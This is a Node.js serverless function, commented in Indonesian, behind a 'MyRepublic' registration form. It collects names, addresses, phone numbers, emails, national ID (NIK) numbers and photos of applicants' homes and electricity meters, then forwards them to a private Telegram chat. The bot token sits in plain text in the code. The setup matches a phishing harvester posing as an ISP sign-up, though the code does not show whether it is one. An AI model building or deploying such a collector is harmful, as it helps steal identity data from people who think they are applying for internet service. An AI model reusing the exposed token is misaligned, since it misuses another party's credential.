const FormData = require('form-data');
const fetch = require('node-fetch');
const busboy = require('busboy');

// Konfigurasi Telegram (isi dengan token dan chat ID Anda)
const TELEGRAM_TOKEN = '8602067767:AAHf0GGV-ynaQoHPxwFQ4n5WYAa7srPuEek';
const TELEGRAM_CHAT_ID = '275358017';

exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ success: false, message: 'Method not allowed' })
        };
    }

    try {
        // Parse multipart form data
        const fields = {};
        const files = {};
        
        await new Promise((resolve, reject) => {
            const bb = busboy({ headers: event.headers });
            
            bb.on('field', (name, value) => {
                fields[name] = value;
            });
            
            bb.on('file', (name, file, info) => {
                const chunks = [];
                file.on('data', (data) => chunks.push(data));
                file.on('end', () => {
                    files[name] = {
                        filename: info.filename,
                        mimeType: info.mimeType,
                        data: Buffer.concat(chunks)
                    };
                });
            });
            
            bb.on('close', resolve);
            bb.on('error', reject);
            bb.end(Buffer.from(event.body, 'base64'));
        });
        
        // Validasi field
        const { nama, alamat, nohp, email, nik } = fields;
        if (!nama || !alamat || !nohp || !email || !nik) {
            return {
                statusCode: 400,
                body: JSON.stringify({ success: false, message: 'Semua field harus diisi' })
            };
        }
        
        // Kirim pesan ke Telegram dengan foto
        const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
        
        // Kirim pesan teks dulu
        const message = `📝 <b>PENDAFTARAN BARU MYREPUBLIC</b>\n` +
                       `👤 <b>Nama:</b> ${nama}\n` +
                       `📍 <b>Alamat:</b> ${alamat}\n` +
                       `📞 <b>No. HP:</b> ${nohp}\n` +
                       `📧 <b>Email:</b> ${email}\n` +
                       `🆔 <b>NIK KTP:</b> ${nik}\n` +
                       `🕒 <b>Waktu:</b> ${timestamp}`;
        
        // Kirim pesan teks
        await sendTelegramMessage(message);
        
        // Kirim foto satu per satu
        const fotoFields = ['foto_depan', 'foto_kiri', 'foto_kanan', 'foto_meter'];
        const fotoNames = {
            'foto_depan': '📸 Foto Tampak Depan',
            'foto_kiri': '📸 Foto Serong Kiri',
            'foto_kanan': '📸 Foto Serong Kanan',
            'foto_meter': '📸 Foto Meteran Listrik'
        };
        
        for (const field of fotoFields) {
            if (files[field] && files[field].data) {
                await sendTelegramPhoto(files[field].data, `${fotoNames[field]}\n${timestamp}`);
            }
        }
        
        return {
            statusCode: 200,
            body: JSON.stringify({ success: true, message: 'Pendaftaran berhasil dikirim' })
        };
        
    } catch (error) {
        console.error('Error:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ success: false, message: 'Terjadi kesalahan server' })
        };
    }
};

async function sendTelegramMessage(text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        })
    });
    return response.json();
}

async function sendTelegramPhoto(photoBuffer, caption) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', photoBuffer, { filename: 'photo.jpg' });
    formData.append('caption', caption);
    formData.append('parse_mode', 'HTML');
    
    const response = await fetch(url, {
        method: 'POST',
        body: formData
    });
    return response.json();
}